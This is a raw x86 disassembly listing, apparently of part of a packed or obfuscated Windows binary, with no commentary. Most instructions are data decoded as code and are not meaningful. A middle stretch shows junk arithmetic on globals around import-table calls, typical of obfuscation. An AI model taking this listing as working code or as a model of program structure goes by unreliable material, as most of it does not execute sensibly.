  402230:	in     al,0x14
  402232:	int3   
  402233:	dec    ebp
  402234:	imul   ebp,DWORD PTR [ecx],0x45
  402237:	pop    esi
  402238:	addr16 out dx,eax
  40223a:	js     0x40225a
  40223c:	xchg   esi,eax
  40223d:	sbb    al,0xea
  40223f:	pop    es
  402240:	sbb    eax,ecx
  402242:	xchg   esp,eax
  402243:	and    al,0xff
  402245:	aas    
  402246:	lods   eax,DWORD PTR ds:[esi]
  402247:	mov    esi,DWORD PTR [ecx+0x4adc271b]
  40224d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40224e:	stc    
  40224f:	inc    esp
  402250:	jp     0x4022a2
  402252:	test   BYTE PTR [ecx+0x118ace96],0x93
  402259:	jl     0x4022ce
  40225b:	pop    edi
  40225c:	pop    ebp
  40225d:	mov    esi,0xdba793b9
  402262:	fisub  WORD PTR [eax]
  402264:	ins    BYTE PTR es:[edi],dx
  402265:	mov    gs,WORD PTR [esp+ebp*8]
  402268:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402269:	int3   
  40226a:	inc    ebp
  40226b:	mov    ebx,0x41c47012
  402270:	jl     0x4022a6
  402272:	das    
  402273:	push   es
  402274:	dec    ecx
  402275:	mov    al,ds:0xefa59cc6
  40227a:	inc    edx
  40227b:	outs   dx,BYTE PTR ds:[esi]
  40227c:	fadd   DWORD PTR [ebp+0x1b]
  40227f:	les    ecx,FWORD PTR [ebx+0x2633cced]
  402285:	jne    0x402234
  402287:	dec    ebp
  402288:	cmp    eax,0x268e4416
  40228d:	mov    WORD PTR [edi],?
  40228f:	push   ecx
  402290:	and    ebx,DWORD PTR [eax-0x2d03832a]
  402296:	out    dx,eax
  402297:	xchg   edx,eax
  402298:	add    edi,0xffffffa9
  40229b:	imul   ebp,DWORD PTR [eax],0xe5229328
  4022a1:	push   0x92532798
  4022a6:	mov    bl,0xae
  4022a8:	jnp    0x40229e
  4022aa:	pop    es
  4022ab:	sub    DWORD PTR [edx],0x5dd0c478
  4022b1:	pop    ss
  4022b2:	into   
  4022b3:	cdq    
  4022b4:	mul    DWORD PTR ds:0x779bfcbf
  4022ba:	mov    edi,0xb4ec6a98
  4022bf:	inc    ebx
  4022c0:	fcomi  st,st(7)
  4022c2:	mov    cl,0x6c
  4022c4:	push   esp
  4022c5:	or     DWORD PTR [ecx],esp
  4022c7:	aas    
  4022c8:	and    BYTE PTR [esi+0x4f],ah
  4022cb:	and    eax,0x2f3edae1
  4022d0:	push   ebx
  4022d1:	add    eax,0xb1e6be6d
  4022d6:	jmp    0x26cc476
  4022db:	and    cl,BYTE PTR [ecx]
  4022dd:	(bad)  
  4022de:	jb     0x4022b1
  4022e0:	(bad)  
  4022e1:	fiadd  DWORD PTR [edx+0x42a3aaa3]
  4022e7:	inc    esi
  4022e8:	fldcw  WORD PTR [esi]
  4022ea:	inc    edi
  4022eb:	pop    ebx
  4022ec:	mov    edi,0x6a74df6a
  4022f1:	pop    eax
  4022f2:	mov    al,ds:0x241b1644
  4022f7:	pop    ebx
  4022f8:	cmp    ebx,ebx
  4022fa:	xchg   ebp,eax
  4022fb:	clc    
  4022fc:	mov    edx,0xe6a6af80
  402301:	data16 out 0xb6,al
  402304:	adc    cl,BYTE PTR [edx+0x2c]
  402307:	mov    bh,0xc9
  402309:	jmp    0x4022b9
  40230b:	lock pop edx
  40230d:	test   al,0x5d
  40230f:	push   ds
  402310:	jmp    0x402375
  402312:	fwait
  402313:	push   cs
  402314:	in     eax,0x44
  402316:	int    0x11
  402318:	retf   
  402319:	(bad)  
  40231b:	pop    esp
  40231c:	ret    0x825
  40231f:	(bad)  
  402320:	jmp    0x9095cc9c
  402325:	test   al,0x47
  402327:	out    0xf3,eax
  402329:	mov    eax,ds:0xfb551a10
  40232e:	es xchg esp,eax
  402330:	pop    es
  402331:	(bad)  
  402332:	fsub   DWORD PTR [ecx+0x6e]
  402335:	iret   
  402336:	dec    edi
  402337:	fs call 0x967a:0xeff5ad61
  40233f:	jbe    0x4022cd
  402341:	mov    BYTE PTR [edx],dl
  402343:	dec    ebx
  402344:	into   
  402345:	call   0x205f24ac
  40234a:	inc    ebp
  40234b:	fld    DWORD PTR [ebx-0x307f8606]
  402351:	pop    ss
  402352:	mov    bh,0xd4
  402354:	into   
  402355:	jnp    0x4023d1
  402357:	and    eax,0x3c879a9f
  40235c:	sahf   
  40235d:	out    dx,al
  40235e:	add    BYTE PTR [eax-0x1f],bl
  402361:	jle    0x40238a
  402363:	pop    ebp
  402364:	or     DWORD PTR [edi],esp
  402366:	jb     0x4023ab
  402368:	jmp    0x2a92e53a
  40236d:	xor    BYTE PTR [edi-0x1c],dh
  402370:	addr16 xchg ebp,eax
  402372:	ret    
  402373:	xor    ebp,DWORD PTR [ecx+0x6e]
  402376:	cmp    cl,BYTE PTR [esi+0x64]
  402379:	repnz ror BYTE PTR [edx+0x454ead35],cl
  402380:	sub    BYTE PTR [edi+esi*2+0x2c860018],ch
  402387:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402388:	adc    eax,0x18ec6f65
  40238d:	mov    ecx,0xb914133f
  402392:	pop    ebx
  402393:	cmp    DWORD PTR [eax],edx
  402395:	mov    ecx,0x30b92b3f
  40239a:	xor    esp,DWORD PTR [ebx+0x1ff0764e]
  4023a0:	pop    ebp
  4023a1:	or     DWORD PTR [edx-0x7],edx
  4023a4:	jecxz  0x4023ee
  4023a6:	cld    
  4023a7:	sub    eax,0x7695e9b9
  4023ac:	mov    edx,0xf26e412f
  4023b1:	out    0xf6,eax
  4023b3:	add    ch,al
  4023b5:	mov    dh,0xff
  4023b7:	dec    eax
  4023b8:	mov    ah,0x17
  4023ba:	(bad)  
  4023bb:	stc    
  4023bc:	push   ss
  4023bd:	inc    esp
  4023be:	retf   0x76b1
  4023c1:	inc    edi
  4023c2:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4023c4:	sub    al,0xa8
  4023c6:	sub    al,0x6
  4023c8:	mov    ?,esp
  4023ca:	jl     0x402437
  4023cc:	enter  0xc0a,0x21
  4023d0:	outs   dx,DWORD PTR ds:[esi]
  4023d1:	mov    es,WORD PTR [eax+eax*2-0x64fb6b85]
  4023d8:	sub    eax,0xaa9cd75c
  4023dd:	push   esi
  4023de:	outs   dx,BYTE PTR ds:[esi]
  4023df:	test   BYTE PTR [ecx],bl
  4023e1:	test   DWORD PTR [edi-0x14],ebx
  4023e4:	mov    cl,0xc4
  4023e6:	cmp    DWORD PTR [edx],0xffffff8d
  4023e9:	(bad)  
  4023ea:	es mov ecx,0x4e8faf80
  4023f0:	mov    edi,0x6cbcef66
  4023f5:	mov    gs:0x6478be48,eax
  4023fb:	mov    dh,0x81
  4023fd:	push   es
  4023fe:	and    eax,0xda087f64
  402403:	pop    ecx
  402404:	or     BYTE PTR es:[esi+0x3],dh
  402408:	les    edi,FWORD PTR [ebp-0xc]
  40240b:	sub    al,0x3e
  40240d:	xchg   esp,eax
  40240e:	sti    
  40240f:	pusha  
  402410:	ret    
  402411:	shl    BYTE PTR [edx*4+0x72734b50],cl
  402418:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402419:	cld    
  40241a:	jl     0x402476
  40241c:	and    eax,0xf1794e71
  402421:	and    BYTE PTR [bp+di-0x1823],0x5c
  402427:	pop    esi
  402428:	repnz fist WORD PTR [ecx+0x1b89e20a]
  40242f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402430:	jno    0x402407
  402432:	cmp    al,0x6
  402434:	hlt    
  402435:	inc    esp
  402436:	(bad)  
  402438:	sub    ch,BYTE PTR [ebx]
  40243a:	cld    
  40243b:	jmp    0x74ff0ba5
  402440:	xchg   ebx,eax
  402441:	xchg   dl,ah
  402443:	es xor eax,0xa27254f4
  402449:	ja     0x4023da
  40244b:	sbb    ebp,0x6b
  40244e:	fild   DWORD PTR [edi-0x182580f7]
  402454:	push   0x5d001cf2
  402459:	xchg   ebx,eax
  40245a:	mov    ah,0xae
  40245c:	shl    DWORD PTR [ebx-0x7c],cl
  40245f:	out    0x2d,al
  402461:	jmp    0x402449
  402463:	cdq    
  402464:	push   esp
  402465:	in     al,0x41
  402467:	test   DWORD PTR [ebx+0x5456ff74],ecx
  40246d:	sub    dh,BYTE PTR [edx-0x666e1169]
  402473:	add    dh,bh
  402475:	loop   0x40242e
  402477:	add    cl,BYTE PTR [ebp+edx*8+0x3aa94a0e]
  40247e:	cmp    ch,bh
  402480:	push   ecx
  402481:	(bad)  
  402482:	nop
  402483:	xor    al,0x52
  402485:	and    bh,BYTE PTR [ebx+eax*2-0x22]
  402489:	push   cs
  40248a:	ins    BYTE PTR es:[edi],dx
  40248b:	inc    edi
  40248c:	and    DWORD PTR [edi+0x4eb8d7c4],edi
  402492:	sbb    al,0x96
  402494:	pop    ecx
  402495:	dec    ecx
  402496:	dec    esp
  402497:	imul   edi,DWORD PTR [edi+0xfb19a38],0xffffffb7
  40249e:	dec    ebx
  40249f:	outs   dx,BYTE PTR ds:[esi]
  4024a0:	in     eax,dx
  4024a1:	or     eax,0x7cbf76a9
  4024a6:	out    dx,eax
  4024a7:	push   esp
  4024a8:	jecxz  0x4024ef
  4024aa:	nop
  4024ab:	and    al,BYTE PTR [ecx+0x41]
  4024ae:	xor    eax,0xa364201f
  4024b3:	int    0x47
  4024b5:	test   ch,bh
  4024b7:	out    dx,al
  4024b8:	(bad)  
  4024b9:	sub    BYTE PTR ds:0x2689a7e8,ch
  4024bf:	mov    bh,0xb0
  4024c1:	add    al,al
  4024c3:	rcl    edx,cl
  4024c5:	int3   
  4024c6:	icebp  
  4024c7:	push   esi
  4024c8:	daa    
  4024c9:	ss and dh,bh
  4024cc:	call   0x9b7f906c
  4024d1:	sbb    ebp,DWORD PTR [edi-0x28]
  4024d4:	mov    dh,0x9
  4024d6:	add    bl,BYTE PTR [edx]
  4024d8:	or     dh,ch
  4024da:	bound  eax,QWORD PTR [ecx-0x15]
  4024dd:	inc    ebp
  4024de:	or     eax,DWORD PTR [ecx+0x67842f14]
  4024e4:	or     al,0x5
  4024e6:	popf   
  4024e7:	popa   
  4024e8:	shl    BYTE PTR [ebp*4+0x4d3d8572],1
  4024ef:	cdq    
  4024f0:	inc    dh
  4024f2:	mov    al,gs:0x53d845b3
  4024f8:	bound  edx,QWORD PTR [eax+0x25]
  4024fb:	popf   
  4024fc:	adc    eax,0x32127ec6
  402501:	mov    ch,0x66
  402503:	jle    0x402519
  402505:	mov    esi,0x8eac6b0d
  40250a:	mov    bh,BYTE PTR [edx+0x17463e4a]
  402510:	or     eax,0xf650a79f
  402515:	adc    al,0xe0
  402517:	inc    edx
  402518:	cwde   
  402519:	mov    bl,BYTE PTR [eax+0x63378795]
  40251f:	add    al,bl
  402521:	add    BYTE PTR [ebx+0x6f],dh
  402524:	ja     0x40258f
  402526:	test   DWORD PTR [edi],eax
  402528:	mov    dl,0x43
  40252a:	cmp    BYTE PTR [edi],0x8b
  40252d:	fistp  WORD PTR [ecx+0x35]
  402530:	inc    esi
  402531:	sub    eax,DWORD PTR [ebx+0x62aaeb6b]
  402537:	or     DWORD PTR [esi-0x595a9c72],ecx
  40253d:	and    BYTE PTR [edx+0x1cc7973f],0x34
  402544:	dec    esp
  402545:	adc    esp,esi
  402547:	lea    ebp,[ebp-0x3428a56]
  40254d:	dec    esi
  40254e:	dec    ecx
  40254f:	mov    edi,0x58397cf8
  402554:	stos   BYTE PTR es:[edi],al
  402555:	inc    esi
  402556:	cmp    DWORD PTR [eax],ebp
  402558:	lods   al,BYTE PTR ds:[esi]
  402559:	push   0x99c7cba2
  40255e:	xor    BYTE PTR [eax+ecx*2+0x3fb7582b],bh
  402565:	neg    DWORD PTR [esi-0x20901863]
  40256b:	loope  0x40258a
  40256d:	retf   0x945b
  402570:	ds into 
  402572:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402573:	sub    al,0x80
  402575:	push   0xc44a5884
  40257a:	in     eax,dx
  40257b:	popf   
  40257c:	cs retf 
  40257e:	cmc    
  40257f:	cmp    BYTE PTR [ecx+0x49],al
  402582:	rcr    BYTE PTR [ebx],1
  402584:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402585:	jg     0x4025ee
  402587:	dec    esi
  402588:	sbb    al,0x73
  40258a:	and    al,0xd3
  40258c:	push   ebx
  40258d:	or     eax,0x9b5f8332
  402592:	pop    DWORD PTR [esi+0x2f]
  402595:	test   al,0x27
  402597:	nop
  402598:	lea    eax,[eax-0x41]
  40259b:	add    ebx,ebx
  40259d:	js     0x4025fa
  40259f:	fwait
  4025a0:	and    eax,0x8d93b25
  4025a5:	xchg   ecx,eax
  4025a6:	dec    DWORD PTR [esi+0x42]
  4025a9:	jmp    0x4025a2
  4025ab:	ja     0x4025b0
  4025ad:	pushf  
  4025ae:	ds xor edi,ecx
  4025b1:	idiv   ebp
  4025b3:	je     0x4025bd
  4025b5:	pop    edx
  4025b6:	jbe    0x4025cb
  4025b8:	push   ecx
  4025b9:	dec    esp
  4025ba:	sbb    DWORD PTR fs:[edi-0x44f8e31c],esp
  4025c1:	push   cs
  4025c2:	push   ecx
  4025c3:	dec    BYTE PTR [ecx-0xd]
  4025c6:	mov    al,0x8f
  4025c8:	sbb    al,0xb
  4025ca:	aas    
  4025cb:	jb     0x402632
  4025cd:	jmp    0x72d06b99
  4025d2:	cmp    eax,DWORD PTR [eax]
  4025d4:	add    BYTE PTR [edi],cl
  4025d6:	mov    bh,0x5
  4025d8:	out    dx,eax
  4025d9:	add    BYTE PTR [edx+0x0],0x11
  4025dd:	add    eax,0x42817b
  4025e2:	mov    DWORD PTR [ebp-0x6c],0x3abc
  4025e9:	adc    DWORD PTR ds:0x428163,edi
  4025ef:	mov    DWORD PTR [ebp-0x68],0x1b45
  4025f6:	cmp    DWORD PTR ds:0x428157,0x0
  4025fd:	mov    DWORD PTR ds:0x428303,0x76b5
  402607:	mov    DWORD PTR ds:0x42815f,edx
  40260d:	mov    DWORD PTR ds:0x428277,0x4dfd
  402617:	jmp    0x40267d
  40261c:	mov    eax,ds:0x428263
  402621:	mov    eax,0x8f5
  402626:	cmp    DWORD PTR ds:0x428157,0x0
  40262d:	ja     0x402669
  402633:	push   DWORD PTR [ebp-0x14]
  402636:	push   0x1475
  40263b:	push   0x3d07
  402640:	push   0x42822f
  402645:	call   DWORD PTR ds:0x428d8c
  40264b:	sbb    DWORD PTR ds:0x42837b,0x36f
  402655:	adc    DWORD PTR ds:0x4282ff,0x428187
  40265f:	sub    DWORD PTR ds:0x42836f,0x42830b
  402669:	and    DWORD PTR ds:0x42814f,0x42823b
  402673:	add    DWORD PTR ds:0x42830f,0x6611
  40267d:	mov    DWORD PTR [ebp-0x64],0x767d
  402684:	sub    eax,DWORD PTR ds:0x428157
  40268a:	mov    DWORD PTR [ebp-0x60],0x1d973857
  402691:	mov    DWORD PTR [ebp-0x5c],0x0
  402698:	add    DWORD PTR ds:0x42814b,0x47ea
  4026a2:	mov    DWORD PTR [ebp-0x34],0x599d
  4026a9:	mov    DWORD PTR [ebp-0x2c],0x165d
  4026b0:	cmp    DWORD PTR ds:0x42827f,0x0
  4026b7:	mov    DWORD PTR ds:0x4282df,edx
  4026bd:	mov    DWORD PTR ds:0x42823b,ecx
  4026c3:	mov    DWORD PTR ds:0x428163,edx
  4026c9:	mov    DWORD PTR ds:0x42825f,0x4bd1
  4026d3:	jmp    0x402743
  4026d8:	mov    eax,ds:0x42814b
  4026dd:	mov    DWORD PTR ds:0x42827f,edx
  4026e3:	cmp    DWORD PTR ds:0x42827f,0x0
  4026ea:	jg     0x402726
  4026f0:	push   DWORD PTR [ebp-0x28]
  4026f3:	push   0x2b2a
  4026f8:	push   0x1aa6
  4026fd:	push   0x3603
  402702:	call   DWORD PTR ds:0x428d90
  402708:	add    DWORD PTR ds:0x428287,0x4282e7
  402712:	sub    DWORD PTR ds:0x428303,0x6e4a
  40271c:	xor    DWORD PTR ds:0x42815b,0x16a6
  402726:	dec    DWORD PTR ds:0x428177
  40272c:	and    DWORD PTR ds:0x42825b,edx
  402732:	or     DWORD PTR ds:0x4282eb,edx
  402738:	mov    eax,ds:0x42817f
  40273d:	and    DWORD PTR ds:0x428393,eax
  402743:	mov    DWORD PTR [ebp-0x1c],0xc51
  40274a:	movzx  eax,WORD PTR ds:0x428393
  402751:	sbb    DWORD PTR ds:0x42825f,eax
  402757:	mov    DWORD PTR [ebp-0x44],0x3f55
  40275e:	or     eax,0x5124
  402763:	mov    DWORD PTR [ebp-0x44],0x1
  40276a:	adc    DWORD PTR ds:0x42823f,0x6ac9
  402774:	mov    DWORD PTR [ebp-0x44],0x42e8
  40277b:	mov    eax,DWORD PTR [ebp-0x60]
  40277e:	dec    DWORD PTR ds:0x4282f3
  402784:	shl    ecx,0x1e
  402787:	not    ecx
  402789:	mov    ecx,DWORD PTR [ebp-0x5c]
  40278c:	jmp    0x402b6a
  402791:	out    dx,eax
  402792:	repz (bad) 
  402794:	cmp    bh,BYTE PTR [ebx+0x63226a1a]
  40279a:	pop    ds
  40279b:	and    eax,0x59d859aa
  4027a0:	stos   BYTE PTR es:[edi],al
  4027a1:	xor    ah,bh
  4027a3:	sbb    BYTE PTR [eax],bl
  4027a5:	sahf   
  4027a6:	adc    bl,BYTE PTR [eax]
  4027a8:	sbb    cl,al
  4027aa:	fist   DWORD PTR [ecx]
  4027ac:	daa    
  4027ad:	xchg   ebp,eax
  4027ae:	shr    BYTE PTR [edi],0x59
  4027b1:	mov    dh,0xe7
  4027b3:	cmc    
  4027b4:	adc    DWORD PTR [eax+0x446125ff],edx
  4027ba:	mov    esi,0xfcf4ffd5
  4027bf:	pop    edx
  4027c0:	xlat   BYTE PTR ds:[ebx]
  4027c1:	aas    
  4027c2:	sub    bl,bl
  4027c4:	mov    eax,ds:0x422c980f
  4027c9:	jnp    0x402783
  4027cb:	sub    ebp,ebp
  4027cd:	mov    al,es:0x6640a75b
  4027d3:	lods   eax,DWORD PTR ds:[esi]
  4027d4:	retf   0x497c
  4027d7:	ret    0xfa98
  4027da:	pop    esi
  4027db:	mov    DWORD PTR [ecx-0x7b],ebx
  4027de:	fs pop ds
  4027e0:	xchg   ebx,eax
  4027e1:	(bad)  
  4027e2:	sti    
  4027e3:	and    cl,BYTE PTR [ecx-0x9acd297]
  4027e9:	pop    esp
  4027ea:	sub    ecx,DWORD PTR [ecx+0x66ed6c1]
  4027f0:	adc    edi,DWORD PTR [ebx+ecx*8-0x6bbe81fc]
  4027f7:	out    0x86,al
  4027f9:	jns    0x4027d4
  4027fb:	lock lahf 
  4027fd:	cmp    eax,0x2e8bfa85
  402802:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402803:	fidivr DWORD PTR [edx+0xf0112a]
  402809:	mov    ds:0xa1f57f88,al
  40280e:	sahf   
  40280f:	push   ds
  402810:	popf   
  402811:	dec    ecx
  402812:	sbb    ebx,DWORD PTR [ebx]
  402814:	pusha  
  402815:	mov    ebp,0x65d13e26
  40281a:	jo     0x402882
  40281c:	pop    ebp
  40281d:	adc    DWORD PTR [esi],eax
  40281f:	into   
  402820:	in     al,0x79
  402822:	int    0x65
  402824:	and    ebp,DWORD PTR [edi-0x5]
  402827:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402828:	cld    
  402829:	addr16 xchg ebx,eax
  40282b:	jnp    0x4028a9
  40282d:	cmp    ch,BYTE PTR [edi+0x47]
  402830:	cmp    eax,0xa3dbf50a
  402835:	dec    eax
  402836:	stc    
  402837:	mov    esp,0xae3ef1a5
  40283c:	daa    
  40283d:	push   edi
  40283e:	ins    DWORD PTR es:[edi],dx
  40283f:	bound  esp,QWORD PTR [edi+edx*2]
  402842:	add    eax,0xb6c360d8
  402847:	loope  0x402826
  402849:	or     cl,BYTE PTR [ebx-0x2ac6c157]
  40284f:	pop    edx
  402850:	jne    0x402813
  402852:	pop    ebx
  402853:	jp     0x40289d
  402855:	and    dh,al
  402857:	cmp    ebp,DWORD PTR [ebx+edi*4-0x4c]
  40285b:	mov    dh,0x76
  40285d:	push   esi
  40285e:	cmp    DWORD PTR [esi],esp
  402860:	addr16 jle 0x40285d
  402863:	mov    ?,WORD PTR [ebp-0x20]
  402866:	sbb    ch,BYTE PTR [eax]
  402868:	shl    DWORD PTR [edx+0x1f],cl
  40286b:	das    
  40286c:	ss jno 0x4028c2
  40286f:	jg     0x4028c4
  402871:	popf   
  402872:	or     ebx,esp
  402874:	sbb    DWORD PTR [edx+0x20],eax
  402877:	dec    edi
  402878:	loope  0x40289d
  40287a:	jns    0x402837
  40287c:	push   ecx
  40287d:	adc    bl,BYTE PTR [ebx+ecx*8+0x38]
  402881:	push   edx
  402882:	jle    0x402877
  402884:	je     0x40288a
  402886:	mov    al,ds:0x6fc94785
  40288b:	(bad)  
  40288c:	lock mov ebx,0x3a50f8f4
  402892:	cmp    esp,eax
  402894:	push   0xffffff9a
  402896:	jecxz  0x40289f
  402898:	dec    ebp
  402899:	(bad)  
  40289a:	rol    dh,0x84
  40289d:	ror    BYTE PTR [esi+0x7c],cl
  4028a0:	sar    DWORD PTR [ebx],cl
  4028a2:	cmp    ebx,DWORD PTR ds:0x9d386fd8
  4028a8:	cli    
  4028a9:	cmc    
  4028aa:	lahf   
  4028ab:	adc    ebx,DWORD PTR [ecx]
  4028ad:	jne    0x4028fe
  4028af:	inc    ebx
  4028b0:	xlat   BYTE PTR ds:[ebx]
  4028b1:	mov    BYTE PTR [edx-0x75],bh
  4028b4:	or     eax,0x49820d83
  4028b9:	add    BYTE PTR [ecx+0x239cba5b],0xe8
  4028c0:	ds enter 0x6e0d,0x39
  4028c5:	mov    BYTE PTR [edx+ebx*2],dl
  4028c8:	shl    BYTE PTR [edx],1
  4028ca:	jbe    0x402857
  4028cc:	mov    ch,BYTE PTR [edi]
  4028ce:	jl     0x4028f5
  4028d0:	and    BYTE PTR [ebx],dh
  4028d2:	outs   dx,BYTE PTR ds:[esi]
  4028d3:	pop    ebp
  4028d4:	adc    bh,BYTE PTR [edx+esi*1]
  4028d7:	popf   
  4028d8:	push   esi
  4028d9:	lds    edi,FWORD PTR [esi-0x2bc0cf03]
  4028df:	loop   0x4028ce
  4028e1:	or     BYTE PTR [edi-0x7c],cl
  4028e4:	pop    edi
  4028e5:	push   ds
  4028e6:	(bad)  
  4028e7:	and    eax,esp
  4028e9:	add    al,0x76
  4028eb:	sar    ebx,0xc9
  4028ee:	adc    eax,0xe037459
  4028f3:	jbe    0x4028c8
  4028f5:	sti    
  4028f6:	stos   BYTE PTR es:[edi],al
  4028f7:	into   
  4028f8:	test   BYTE PTR [edi+0x34b06e1f],bl
  4028fe:	xchg   ebp,eax
  4028ff:	add    ah,BYTE PTR [eax-0x5f]
  402902:	mov    eax,ds:0x1b409b5
  402907:	mov    dl,0x94
  402909:	scas   al,BYTE PTR es:[edi]
  40290a:	fmul   st(5),st
  40290c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40290d:	and    al,0xa7
  40290f:	inc    esp
  402910:	jno    0x4028d9
  402912:	fwait
  402913:	xor    esi,DWORD PTR [edx-0x6e]
  402916:	push   ebp
  402917:	xor    esp,DWORD PTR [ebp-0x4309cf5a]
  40291d:	mov    eax,0xc5b44ad
  402922:	mov    ch,0x48
  402924:	and    dh,BYTE PTR [esi]
  402926:	and    DWORD PTR [edi],ebp
  402928:	mov    eax,0xfeaee33f
  40292d:	(bad)  [ebx+edx*8]
  402930:	inc    ebx
  402931:	sti    
  402932:	pop    edx
  402933:	sar    ecx,cl
  402935:	in     al,dx
  402936:	xor    al,0xfe
  402938:	stos   BYTE PTR es:[edi],al
  402939:	inc    ebp
  40293a:	cdq    
  40293b:	mov    ds:0xd180403f,al
  402940:	cs xchg edi,eax
  402942:	cmp    eax,0x29208f00
  402947:	xor    DWORD PTR [ebx-0x21c6c0b6],ecx
  40294d:	and    bl,BYTE PTR ds:0x73a50782
  402953:	lods   eax,DWORD PTR ds:[esi]
  402954:	test   eax,0xaa0d3f91
  402959:	sub    BYTE PTR [eax],0xb0
  40295c:	mov    ebp,gs
  40295e:	jne    0x40294c
  402960:	inc    eax
  402961:	and    ch,0xb6
  402964:	loope  0x40291b
  402966:	scas   eax,DWORD PTR es:[edi]
  402967:	push   0x6bd97cc
  40296c:	add    al,0x66
  40296e:	jae    0x402946
  402970:	dec    ebx
  402971:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402972:	hlt    
  402973:	jmp    0xc9a33309
  402978:	sub    DWORD PTR [esi+0x20],esi
  40297b:	data16 hlt 
  40297d:	inc    edx
  40297e:	and    DWORD PTR [ecx+0x1a],esi
  402981:	retf   0x63b4
  402984:	lds    edi,FWORD PTR [edi]
  402986:	stos   DWORD PTR es:[edi],eax
  402987:	sahf   
  402988:	cmp    BYTE PTR [ebx],cl
  40298a:	xchg   ebp,eax
  40298b:	pusha  
  40298c:	push   0xfffffff4
  40298e:	push   edx
  40298f:	and    DWORD PTR [edi-0x68],edx
  402992:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402993:	aaa    
  402994:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402995:	aad    0x99
  402997:	jmp    0x94ef990f
  40299c:	ja     0x4029e9
  40299e:	lods   al,BYTE PTR ds:[esi]
  40299f:	xchg   ebp,eax
  4029a0:	push   0x2d
  4029a2:	mov    DWORD PTR [edi+0x38c8d7ba],edx
  4029a8:	sub    dl,BYTE PTR [edx]
  4029aa:	test   al,0x8e
  4029ac:	or     cl,BYTE PTR ds:0x8683fcf5
  4029b2:	cwde   
  4029b3:	and    bh,cl
  4029b5:	mov    ebp,0x5f16b3ee
  4029ba:	es addr16 mov edi,0xe8dcc704
  4029c1:	data16 hlt 
  4029c3:	inc    ebp
  4029c4:	std    
  4029c5:	xchg   BYTE PTR [ebx+0x1f3f6a94],cl
  4029cb:	inc    ecx
  4029cc:	mov    DWORD PTR [esi],esp
  4029ce:	sbb    al,0x53
  4029d0:	fsubr  DWORD PTR [esi]
  4029d2:	cmp    edi,esp
  4029d4:	ret    
  4029d5:	arpl   WORD PTR [esi+eiz*8+0x265c45cf],bx
  4029dc:	sub    al,0x65
  4029de:	and    edi,DWORD PTR [ebp-0xe7813e7]
  4029e4:	call   0xb3a6ec3d
  4029e9:	fisttp QWORD PTR [esi-0xe990a11]
  4029ef:	repz jp 0x4029bb
  4029f2:	add    al,0xab
  4029f4:	dec    edx
  4029f5:	sub    esi,edx
  4029f7:	rol    DWORD PTR [edx+0x1c],0xf3
  4029fb:	and    BYTE PTR [edi+ebx*8],0xef
  4029ff:	enter  0xa902,0x3d
  402a03:	cmp    bl,ah
  402a05:	ds js  0x402a1f
  402a08:	nop
  402a09:	ins    BYTE PTR es:[edi],dx
  402a0a:	sbb    eax,0xcddabccc
  402a0f:	sbb    bl,ah
  402a11:	jmp    0x104a:0xda5f0c30
  402a18:	push   ss
  402a19:	or     DWORD PTR ds:0xaf253466,0xffffffee
  402a20:	out    0x96,eax
  402a22:	push   ds
  402a23:	daa    
  402a24:	repnz push 0x75
  402a27:	mov    WORD PTR [edi+esi*4-0x31],es
  402a2b:	dec    esp
  402a2c:	add    BYTE PTR [eax-0x3ff563bf],bh
  402a32:	sbb    BYTE PTR [edi+0x5a6bdeaf],0x5a
  402a39:	stos   BYTE PTR es:[edi],al
  402a3a:	xor    ch,BYTE PTR [esi-0x338907ac]
  402a40:	cmp    eax,0x95787200
  402a45:	(bad)
  402a49:	xor    edx,DWORD PTR [ebx]
  402a4b:	adc    BYTE PTR [edx],ch
  402a4d:	xor    eax,0x843b1746
  402a52:	pop    ss
  402a53:	sahf   
  402a54:	sbb    DWORD PTR [esi-0x65],ebx
  402a57:	in     al,dx
  402a58:	arpl   WORD PTR [esi+0x37],dx
  402a5b:	ret    
  402a5c:	inc    ebx
  402a5d:	rol    BYTE PTR [edx+0x221b9d0e],cl
  402a63:	stc    
  402a64:	mov    ebx,0x97c69805
  402a69:	jle    0x402a8a
  402a6b:	or     ebp,DWORD PTR [edx]
  402a6d:	aad    0x26
  402a6f:	pushf  
  402a70:	fadd   QWORD PTR [edx+0x34]
  402a73:	jnp    0x402ac6
  402a75:	jg     0x402aa3
  402a77:	clc    
  402a78:	in     eax,0x46
  402a7a:	dec    edx
  402a7b:	fld    st(3)
  402a7d:	mov    ebp,0xc98b90f1
  402a82:	dec    ebp
  402a83:	inc    esi
  402a84:	push   ecx
  402a85:	adc    edx,ebp
  402a87:	add    bl,dh
  402a89:	(bad)  
  402a8a:	mov    edx,0x3dea5789
  402a8f:	fwait
  402a90:	mov    ch,0x62
  402a92:	das    
  402a93:	sar    BYTE PTR [edx],cl
  402a95:	call   0xb4ec0571
  402a9a:	pop    ss
  402a9b:	inc    ecx
  402a9c:	scas   al,BYTE PTR es:[edi]
  402a9d:	cs out dx,al
  402a9f:	or     ch,bl
  402aa1:	pop    esp
  402aa2:	pop    ebx
  402aa3:	dec    ecx
  402aa4:	cmp    DWORD PTR ds:0x228198b9,esi
  402aaa:	xor    eax,DWORD PTR [edi+0x7dfebc19]
  402ab0:	sub    BYTE PTR ds:0xfe7df893,bh
  402ab6:	(bad)  
  402ab8:	inc    ecx
  402ab9:	add    al,0xf9
  402abb:	pop    ecx
  402abc:	add    esi,DWORD PTR [ecx]
  402abe:	aas    
  402abf:	test   DWORD PTR [ecx-0x6b621ef2],eax
  402ac5:	arpl   WORD PTR [ebp+0x5e],bx
  402ac8:	fsub   st,st(5)
  402aca:	fstp   TBYTE PTR [ecx-0x2f17d3ac]
  402ad0:	sub    ch,BYTE PTR [edi-0x38]
  402ad3:	lahf   
  402ad4:	call   0x9f3c:0x527f47ad
